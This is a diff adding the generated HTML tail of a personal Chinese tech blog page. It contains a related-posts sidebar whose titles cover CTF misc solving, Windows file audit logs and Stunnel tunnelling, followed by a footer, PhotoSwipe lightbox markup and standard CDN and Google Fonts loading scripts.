+        <div class="article-details">
+            <h2 class="article-title">CTF misc常用解题软件</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ctf-misc%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E7%AC%94%E8%AE%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CTF misc解题思路笔记(一)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/windows%E6%96%87%E4%BB%B6%E5%AE%A1%E6%A0%B8%E6%97%A5%E5%BF%97%E5%AE%A1%E6%A0%B8%E8%AE%B0%E5%BD%95/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows文件审核日志审核记录</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E9%80%9A%E8%BF%87stunnel%E9%9A%A7%E9%81%93%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">通过Stunnel隧道加密流量</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Tiny Rick Blog
+    </section>
+    
+    <section class="powerby">
+        
+            <img src="/img/gov.png" title="中华人民共和国工业和信息化部"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">粤ICP备18150711号</a> <br/>
+        
+
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
